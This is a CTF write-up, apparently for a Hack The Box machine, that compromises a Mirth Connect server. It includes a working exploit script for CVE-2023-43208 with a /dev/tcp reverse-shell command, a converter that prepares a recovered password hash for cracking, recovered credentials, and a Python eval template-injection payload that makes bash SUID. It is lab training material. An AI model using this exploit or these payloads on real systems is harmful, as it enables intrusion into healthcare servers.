---
layout: post
title: Interpreter - CTF
date: 2026-05-12
pid: "4856"
category: "CTFs"
difficulty: "MEDIUM"
description: "Chaining an unauthenticated Mirth Connect RCE with database credential recovery for initial access to exploit a Python-based server-side template injection for root access."
tags: [HTB, Linux, Python, Mirth Connect]
unlock_date: 2026-07-18 12:00:00 -0700
---
### 1. Overview
This machine involved exploiting a vulnerable instance of NextGen Healthcare Mirth Connect (CVE-2023-43208) to achieve unauthenticated remote code execution. After obtaining a foothold, hardcoded database credentials were used to recover a user hash, which was cracked to gain SSH access. Privilege escalation was achieved by exploiting an insecure `eval()` call within a Python-based notification script using server side template injection to gain root.
### 2. Recon
Starting off this machine, I ran the standard Nmap service and port scan:
```
╰─❯ nmap -sCV -oN interpreter.nmap --min-rate 5000 10.129.244.184
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp  open  http     Jetty
443/tcp open  ssl/http Jetty
```

The scan found 3 ports:
- **22 SSH**
- **80 HTTP**
- **443 HTTPS**

Browsing to the website hosted at port 80 greeted me with a NextGen Healthcare Mirth Connect dashboard. From this dashboard I was about to download a file called `webstart.jnlp` via the 'Launch Mirth Connect Administrator' button.
### 3. Foothold
Reading the `webstart.jnlp` file revealed a version number at the very bottom of the file:
```
<application-desc main-class="com.mirth.connect.client.ui.Mirth">
        <argument>https://10.129.244.184:443</argument>
        <argument>4.4.0</argument>
    </application-desc>
```

This version of Mirth Connect is vulnerable to RCE and labeled `CVE-2023-43208`. This vulnerability allows an unauthenticated attacker to send a malicious XML payload to the server, which gets processed without proper validation.

I wrote the following script to craft and send the exploit to the target:
```
import sys
import requests

def craft_payload(command):
    command = command.replace("&", "&amp;")
    command = command.replace("<", "&lt;")
    command = command.replace(">", "&gt;")
    command = command.replace('"', "&quot;")
    command = command.replace("'", "&apos;")

    xml_data = f"""
    <sorted-set>
        <string>abcd</string>
        <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
                <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                    <iTransformers>
                        <org.apache.commons.collections4.functors.ConstantTransformer>
                            <iConstant class="java-class">java.lang.Runtime</iConstant>
                        </org.apache.commons.collections4.functors.ConstantTransformer>
                        <org.apache.commons.collections4.functors.InvokerTransformer>
                            <iMethodName>getMethod</iMethodName>
                            <iParamTypes>
                                <java-class>java.lang.String</java-class>
                                <java-class>[Ljava.lang.Class;</java-class>
                            </iParamTypes>
                            <iArgs>
                                <string>getRuntime</string>
                                <java-class-array/>
                            </iArgs>
                        </org.apache.commons.collections4.functors.InvokerTransformer>
                        <org.apache.commons.collections4.functors.InvokerTransformer>
                            <iMethodName>invoke</iMethodName>
                            <iParamTypes>
                                <java-class>java.lang.Object</java-class>
                                <java-class>[Ljava.lang.Object;</java-class>
                            </iParamTypes>
                            <iArgs>
                                <null/>
                                <object-array/>
                            </iArgs>
                        </org.apache.commons.collections4.functors.InvokerTransformer>
                        <org.apache.commons.collections4.functors.InvokerTransformer>
                            <iMethodName>exec</iMethodName>
                            <iParamTypes>
                                <java-class>java.lang.String</java-class>
                            </iParamTypes>
                            <iArgs>
                                <string>{command}</string>
                            </iArgs>
                        </org.apache.commons.collections4.functors.InvokerTransformer>
                    </iTransformers>
                </target>
                <methodName>transform</methodName>
                <eventTypes>
                    <string>compareTo</string>
                </eventTypes>
            </handler>
        </dynamic-proxy>
    </sorted-set>
    """
    return xml_data

def exploit(target, lhost, lport):
    command = f"sh -c $@|sh . echo bash -c '0<&53-;exec 53<>/dev/tcp/{lhost}/{lport};sh <&53 >&53 2>&53'"
    xml_data = craft_payload(command)

    endpoint = f"{target.rstrip('/')}/api/users"
    headers = {
        "X-Requested-With": "OpenAPI",
        "Content-Type": "application/xml"
    }
    
    response = requests.post(
        url=endpoint,
        headers=headers,
        data=xml_data,
        verify=False,
        timeout=10
    )

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 exploit_poc.py <target> <lhost> <lport>")
        print("Example: python3 exploit_poc.py https://10.129.244.184 10.10.14.5 4444")
        sys.exit(1)

    target = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]

    exploit(target, lhost, lport)

if __name__ == '__main__':
    main()
```

After setting up a netcat listener, I ran the exploit and landed a revshell.

Now that I had a revshell on the machine, I could start doing some enumeration. The revshell put me into `/usr/local/mirthconnect/`. In that directory I found a `conf` folder containing the `mirth.properties` file.

The `mirth.properties` file had some hardcoded SQL databases credentials in it:
```
mirth@interpreter:/usr/local/mirthconnect/conf$ cat mirth.properties
# database credentials
database.username = mirthdb
database.password = MirthPass123!
```

Using these credentials, I managed to recovery a hash for the user `sedric`:
```
sedric:u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

Since Mirth Connect uses a more secure hash, I had to write the following script to convert the hash into something hashcat could use:
```
#!/usr/bin/env python3
import sys
import base64

def convert_hash(mirth_b64):
    raw_bytes = base64.b64decode(mirth_b64)
    
    if len(raw_bytes) != 40:
        print("[-] Error: Decoded hash is not exactly 40 bytes.")
        return

    salt_bytes = raw_bytes[:8]
    key_bytes = raw_bytes[8:]

    hashcat_salt = base64.b64encode(salt_bytes).decode('utf-8')
    hashcat_key = base64.b64encode(key_bytes).decode('utf-8')

    iterations = "600000"
    formatted_hash = f"sha256:{iterations}:{hashcat_salt}:{hashcat_key}"

    print("[+] Conversion Successful!")
    print(f"[>] {formatted_hash}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 mirth_converter.py <Mirth_Base64_String>")
        print("Example: python3 mirth_converter.py u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==")
        sys.exit(1)

    convert_hash(sys.argv[1])
```

Running the script returned a  hash compatible with hashcat.
```
╰─❯ python3 hash_conversion.py u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
[+] Conversion Successful!
[>] sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

Using hashcat, I recovered the following credentials:
```
sedric:snowflake1
```
### 4. Root
Now that I had ssh access, I could start enumeration for my path to root. The first things I checked were the `/opt` folder and the `sudo -l` command. The `sudo -l` command return a message saying `sudo not found`  and the `/opt` folder had nothing in it.

After a while, I decided to upload `pspy64` to the machine to see what processes were running as root. This found a python script called `notif.py`
```
sedric@interpreter:/tmp$ ./pspy64
2026/05/12 18:21:03 CMD: UID=0     PID=3544   | /usr/bin/python3 /usr/local/bin/notif.py
```

After checking the permissions on that file, I found that the user `sedric` is allowed to read that file. After inspecting the file, I found that it was vulnerable to server side template injection via the `template()` function. The function passes weakly sanitized user input into an f-string which is then passed to an `eval()` statement:
{% raw %}
```
def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"
```
{% endraw %}

To exploit this, I crafted an xml payload with a command in place of the first name. To bypass the regex filtering, I simply used `chr(32)` instead of normal white spaces:
```
<patient>
    <firstname>{__import__('os').system('chmod'+chr(32)+'+s'+chr(32)+'/bin/bash')}</firstname>
    <lastname>Hehehjhavsb</lastname>
    <sender_app>Mirth</sender_app>
    <timestamp>now</timestamp>
    <birth_date>01/01/1990</birth_date>
    <gender>M</gender>
</patient>
```

Then I could send the payload to trigger it:
```
╰─❯ curl -X POST http://127.0.0.1:54321/addPatient -H "Content-Type: application/xml" -d @payload.xml
Patient 0 Hehehjhavsb (M), 36 years old, received from Mirth at now
```

Now finally, I could execute `bash -p` to gain root on the machine:
```
sedric@interpreter:/tmp$ bash -p
bash-5.2#
```
### 5. Conclusion
Initial access was achieved by exploiting an unauthenticated RCE vulnerability in Mirth Connect (CVE-2023-43208), which allowed for the execution of a malicious XML payload and provided a reverse shell. From there, database credentials recovered from the `mirth.properties` file were used to extract a password hash for the `sedric` user.

After cracking the hash and gaining SSH access, further investigation using `pspy` uncovered a Python script called `notif.py` running as root. By exploiting an insecure `eval()` function within the script's `template()` function, it was possible to bypass input filters and set the SUID bit on the `bash` binary, which ultimately provided root access to the machine.
